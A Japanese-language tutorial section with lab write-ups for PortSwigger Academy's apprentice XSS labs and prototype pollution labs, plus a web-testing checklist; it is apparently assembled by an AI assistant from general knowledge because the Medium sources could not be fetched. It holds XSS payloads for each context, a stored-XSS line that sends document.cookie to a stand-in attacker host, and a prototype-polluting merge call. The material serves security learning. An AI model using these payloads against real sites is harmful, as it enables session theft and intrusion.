## ラボ攻略ライトアップとチェックリスト

本節では、PortSwigger Web Security Academy の代表的なラボ群（Apprentice級XSS全9問、Prototype Pollution全ラボ）の攻略パターンを整理し、最後に実務・CTFで使える学習チェックリストをまとめる。反射型の素朴な `<script>alert(1)</script>` は既知という前提で、各ラボが「なぜそのコンテキストでその形のペイロードが必要になるのか」という**構文解析（パーサ）の観点**を中心に解説する。

### 7-B-1. Apprentice級 XSSラボ全9問の攻略パターン

> ⚠️ **未取得の資料**: 「PortSwigger XSS Labs: A Complete Guide to All 9 Apprentice-Level Challenges」（Thanuj Dilshan Thilakarathne, Medium）は自動取得できませんでした（理由: 実行環境のegressプロキシが medium.com ドメインへのアクセスを一律ブロックしているため）。詳細な手順・スクリーンショット付きの解説は以下のURLからユーザーご自身で直接ご覧ください。
> https://medium.com/@thanujthilakarathne/portswigger-xss-labs-a-complete-guide-to-all-9-apprentice-level-challenges-6fba56da8635

（以下は未取得資料の補足として一般知識に基づく解説です。PortSwigger Academyの公開ラボ構成に基づき、9問の代表的な出題パターンを「壊れ方」の観点で整理する。）

Apprentice級のXSSラボは、**入力値が出力される「コンテキスト（文脈）」ごとに壊し方が異なる**ことを体系的に学ばせる設計になっている。ここでいうコンテキストとは、HTMLパーサ・属性値パーサ・JavaScriptパーサ・URLパーサなど、入力が最終的にどの構文解析器に渡されるかという分類である。

**① タグ本文への反射（HTMLコンテキスト）**

検索ボックスの入力がエスケープなしで `<h1>0 results for 'xxx'</h1>` のようにHTML本文へ差し込まれるケース。

```html
<script>alert(1)</script>
```
なぜ動くか: サーバーが `<` `>` を実体参照（`&lt;` `&gt;`）に変換していないため、ブラウザのHTMLパーサが入力をそのままタグとして解釈し、新しい `<script>` 要素を生成してしまう。

**② HTML属性値への反射（属性コンテキスト）**

`<input value="xxx">` のようにダブルクォート属性の中に入力が入るケース。`<` `>` はエンコードされていても、ダブルクォート `"` がエンコードされていないことが多い。

```html
"><svg onload=alert(1)>
```
なぜ動くか: 属性値パーサは `"` を見た時点でその属性値の終端とみなす。続く `>` でタグそのものを閉じ、新たに `<svg onload=...>` という別要素を開始させることで、属性の外に出て任意のタグ・イベントハンドラを注入できる。

**③ 属性から抜けられない場合のイベントハンドラ注入**

`<` `>` `"` は全てエンコードされるが、属性値自体は自由に書けるケース。

```html
" autofocus onfocus=alert(1) x="
```
なぜ動くか: タグを閉じずに、同じ `<input>` タグ内に新しい属性（`onfocus`）を追加する。`autofocus` 属性がページロード時に自動的にフォーカスを当てるため、ユーザー操作なしで `onfocus` イベントハンドラが発火する。

**④ `<script>` タグ内への文字列反射（JSコンテキスト）**

```html
<script>var searchTerm = 'xxx';</script>
```
のように既存のJS文字列リテラルの中に入力が入るケース。

```js
'-alert(1)-'
```
または
```js
';alert(1)//
```
なぜ動くか: JSパーサはシングルクォートで文字列の終端を認識する。`'-alert(1)-'` は「文字列を閉じる → 減算演算子として `alert(1)` を実行 → 再度文字列を開いて構文エラーを防ぐ」という式に変換される。セミコロン版は文を分割して新しい文として `alert(1)` を実行し、`//` で行末以降をコメントアウトして構文エラーを防ぐ。

**⑤ タグ属性の許可リスト（サニタイズ）を回避するケース**

`<script>` や `on*` イベント属性のみをブラックリスト的に除去するフィルタに対して、`<img src=1 onerror=alert(1)>` のような読み込み失敗イベントを使う。

```html
<img src=x onerror=alert(1)>
```
なぜ動くか: `src` に無効な値を与えると画像読み込みが失敗し、ブラウザは自動的に `onerror` ハンドラを発火させる。フィルタが `<script>` タグのみを検知対象にしていると、`<img>` 要素経由のイベントハンドラは素通りする。

**⑥ 特定タグ・属性のブラックリストを回避（タグ名の大文字小文字・改行差し込み）**

```html
<sCrIpT>alert(1)</sCrIpT>
```
なぜ動くか: HTMLのタグ名は大文字小文字を区別しない（case-insensitive）が、正規表現ベースの単純なフィルタは大文字小文字を区別してしまうことがあり、`<script>` の小文字固定パターンしか検出しない実装だと回避できる。

**⑦ Stored XSS（格納型）― コメント欄などに保存され、閲覧者側で発火**

```html
<script>fetch('https://attacker.example/steal?c='+document.cookie)</script>
```
なぜ動くか: 入力がデータベースに保存され、他ユーザーがそのページを閲覧するたびにHTMLとして再解釈・実行される。攻撃者自身ではなく被害者のブラウザ・セッションで実行される点が反射型と異なり、影響範囲（不特定多数のセッションハイジャック）が大きい。

**⑧ イベントハンドラ属性が使えず、`javascript:` URLスキームを使うケース**

`<a href="xxx">click</a>` のように `href` 属性に入力が入るケース。

```html
javascript:alert(document.domain)
```
なぜ動くか: `javascript:` はURLスキームの一種として扱われるが、ブラウザはこのスキームをJavaScriptエンジンへの実行指示として特別扱いする。リンクがクリックされた際、通常のナビゲーションの代わりにスクリプトが実行される。

**⑨ DOM-based XSS ― `location.hash` を経由してjQueryのセレクタに渡されるケース**

投稿タイトルを `location.hash` から読み取り、`$('#'+hash)` のようにjQueryのセレクタとして渡してオートスクロールする実装。

```
https://vulnerable-site.com/#<img src=1 onerror=alert(1)>
```
なぜ動くか: jQueryの `$()` はセレクタ文字列がHTMLタグの形（`<`で始まる）と判定すると、CSSセレクタではなくDOM要素として**その場でHTML化して生成**する（jQueryの自動判別ロジック）。これにより `location.hash` というクライアント側のみで完結するsink（入力が最終的に実行・解釈される危険な代入先）に、任意のHTMLが注入される。サーバーを一切経由しないため、通信ログやWAFでは検知しにくい点が特徴。

> 出典: PortSwigger XSS Labs: A Complete Guide to All 9 Apprentice-Level Challenges — https://medium.com/@thanujthilakarathne/portswigger-xss-labs-a-complete-guide-to-all-9-apprentice-level-challenges-6fba56da8635 （本文取得不可のため見出し構成のみを参考に、内容は一般知識で再構成）

---

### 7-B-2. Prototype Pollution 全ラボのライトアップ

> ⚠️ **未取得の資料**: 「PortSwigger Labs: Prototype Pollution Writeup (All labs)」（awes0meness, Medium）は自動取得できませんでした（理由: 実行環境のegressプロキシが medium.com ドメインへのアクセスを一律ブロックしているため）。詳細な手順は以下のURLからユーザーご自身で直接ご覧ください。
> https://medium.com/@awes0me.writes/portswigger-labs-prototype-pollution-writeup-all-labs-9a2534bc8e07

（以下は未取得資料の補足として一般知識に基づく解説です。）

**プロトタイプ汚染（Prototype Pollution）とは何か**

JavaScriptのオブジェクトは、自身がプロパティを持たない場合、`__proto__` を通じてつながる**プロトタイプチェーン**を辿ってプロパティを探索する。攻撃者が `__proto__.foo = "bar"` のような形で `Object.prototype` そのものに任意のプロパティを追加できてしまうと、そのプログラム内であらゆるオブジェクトが `obj.foo` で `"bar"` を返すようになる。これは個別のオブジェクトのバグではなく、**言語の基盤となる共有オブジェクト（`Object.prototype`）を汚染する**ため、影響範囲がアプリケーション全体に及ぶ。

原因の典型例は、再帰的なオブジェクトのマージ・クローン処理（`lodash.merge`、`$.extend`、独自実装の `deepMerge` など）で、キー名に対する検証を行わずに代入していることにある。

```js
function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object') {
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}
merge({}, JSON.parse('{"__proto__": {"isAdmin": true}}'));
```
なぜ動くか: `source` のキーに `__proto__` という文字列を持たせると、`target[key]` は `target.__proto__`、すなわち `target` が参照するプロトタイプオブジェクト（多くの場合 `Object.prototype`）そのものを指す。ここに再帰的に代入が続くと、プロトタイプ自身に新しいプロパティが追加され、以後生成される**すべての通常オブジェクト**がそのプロパティを継承してしまう。

**クライアント側プロトタイプ汚染 → DOM XSS への昇格**

PortSwiggerの代表的なラボでは、URLのクエリパラメータをオブジェクトにパースするライブラリ（`jQuery.extend` 系）が汚染源（source）となり、その後スクリプトが `Object.prototype` から継承した特定のプロパティ（**gadget、汚染を実害に変換する経路**）を読み取って `<script src="...">` のURLを組み立てる。

```
/?__proto__[transport_url]=data:,alert(1);//
```
なぜ動くか: `__proto__[transport_url]` というクエリキーが `Object.prototype.transport_url` を汚染する。アプリのコードが `config.transport_url` を読み取って `<script src="' + config.transport_url + '/example.js">` のように動的にscriptタグを組み立てていると、汚染された値がそのままURLとして使われる。`data:` スキームはインラインでコンテンツを埋め込めるURLスキームであり、`data:,alert(1);` はMIMEタイプ省略時の既定として `text/plain` 相当のスクリプトソースを与える。末尾の `//` はアプリ側がハードコードしている `/example.js` という接尾辞を行コメントとして無効化する役割を持つ。

**サーバーサイド・プロトタイプ汚染（Node.js / Express）**

サーバー側でも同種のマージ処理（リクエストボディのJSONをconfigオブジェクトへマージするなど）があると、`Object.prototype` 経由で以下のようなgadgetを悪用できる：

- **サービス拒否（DoS）**: `Object.prototype.toString` のような組み込みメソッドを上書きし、内部処理で例外を発生させる。
- **リモートコード実行（RCE）**: 一部のテンプレートエンジンやシリアライズライブラリが、オブジェクトの `__proto__` 経由で汚染された設定値（例: `child_process` を呼び出す設定、テンプレートのコンパイルオプションなど）を信頼してしまうことで、任意コード実行に至るケースがある（例: pugやejsのようなテンプレートエンジンでのgadget悪用が典型例として知られる）。

**防御策**

1. `Object.create(null)` で**プロトタイプを持たないオブジェクト**を使い、汚染の踏み台自体を作らない。
2. `Object.freeze(Object.prototype)` により `Object.prototype` への書き込みそのものをエンジンレベルで禁止する。
3. マージ・パース処理で `__proto__` / `constructor` / `prototype` という文字列をキーとして拒否する（denylist）。
4. `Map` を辞書として使う（`Map` はプロトタイプチェーンを介した動的探索の対象にならないため、キー名衝突による汚染が原理的に起きない）。
5. 新しめのNode.js / npmライブラリでは `JSON.parse` の第二引数（reviver）でキー検証を行う、あるいは `Object.hasOwn()` で継承プロパティと自プロパティを明確に区別するといった対策も併用される。

> 出典: PortSwigger Labs: Prototype Pollution Writeup (All labs) — https://medium.com/@awes0me.writes/portswigger-labs-prototype-pollution-writeup-all-labs-9a2534bc8e07 （本文取得不可のため一般知識で再構成）

---

### 7-B-3. PortSwigger学習チェックリスト

> 出典: Portswigger_checklist (ashardian) — https://github.com/ashardian/Portswigger_checklist

このリポジトリはPortSwigger Web Security Academyの学習項目を体系的に列挙したチェックリストであり、XSSに限らず学習トピック全体（初級〜上級）を段階的に並べたロードマップとして構成されている。取得できた範囲では、XSS分野は「反射型 → 格納型 → DOM型 → フィルタバイパス」という順序で進めることが推奨されている。この構成に基づき、本教科書のここまでの内容と対応させた実務向けチェックリストを以下にまとめる。

**基礎コンテキストの特定**
- [ ] 入力がどの構文解析器（HTML本文 / 属性値 / JS文字列 / URL / CSS）に渡っているかを、ブラウザのDevToolsで実際のDOMを見て確認したか
- [ ] `<` `>` `"` `'` の4文字それぞれが個別にエンコードされているか、あるいは全く処理されていないかを切り分けたか

**反射型・格納型**
- [ ] 反射位置がHTMLコメント内・`<textarea>` 内・`<title>` 内など、通常のタグ挿入が効かない特殊要素の中でないか確認したか
- [ ] Stored XSSでは、入力した本人以外（管理者ビューなど権限の異なるユーザー）が閲覧するページまで波及していないか確認したか（管理者パネル閲覧によるセッションハイジャックは影響度が高い）

**DOM-based XSS**
- [ ] source（`location.hash` / `location.search` / `document.referrer` / `window.name` / `postMessage`）とsink（`innerHTML` / `document.write` / `eval` / jQueryの `$()` / `location` への代入）の組み合わせを洗い出したか
- [ ] jQueryなど、文字列の形からHTML/セレクタを自動判別するライブラリ特有の挙動を悪用できないか確認したか

**フィルタ・サニタイズ回避**
- [ ] タグ名・属性名の大文字小文字を変えて単純な文字列比較・正規表現フィルタを回避できないか
- [ ] `<script>` 以外のイベントハンドラ持ちタグ（`<img onerror>` `<svg onload>` `<body onload>` など）を試したか
- [ ] 二重エンコード・部分的なサニタイズ後の再結合（フィルタが一度しか置換処理をしないことで、ネストした文字列が復元されるケース）を試したか

**Prototype Pollution**
- [ ] クエリパラメータやJSONボディのキーとして `__proto__` `constructor.prototype` を送信し、レスポンスや後続の挙動に変化が出るか確認したか
- [ ] 汚染源（source）を見つけた後、実際に影響を及ぼすgadgetプロパティ（設定値・テンプレートオプションなど）をアプリのJSソースから探したか
- [ ] クライアント側の汚染をDOM XSSにまで昇格できる `<script src>` 組み立てロジックがないか確認したか

**CSP・その他の防御回避（発展）**
- [ ] CSP（Content-Security-Policy）のソース許可リストに、JSONPエンドポイントやオープンリダイレクトなど汎用のホワイトリストドメインが含まれていないか
- [ ] `nonce` ベースのCSPで、レスポンスヘッダーとHTML内nonce値の不一致・使い回しがないか

このチェックリストは網羅を目的とせず、「どの原理が働いているために攻撃が成立するか」を都度言語化しながら潰していくための骨組みとして使うことを推奨する。
